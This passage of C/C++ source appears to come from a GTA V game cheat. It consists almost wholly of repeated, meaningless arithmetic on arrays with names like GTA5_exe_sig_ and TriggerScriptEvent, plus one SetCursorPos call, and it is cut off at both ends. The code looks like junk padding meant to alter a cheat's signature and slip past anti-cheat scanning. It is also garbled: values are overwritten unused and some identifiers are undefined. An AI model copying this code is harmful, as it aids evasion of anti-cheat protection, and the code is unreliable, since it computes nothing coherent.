				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			SetCursorPos(x, y);
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
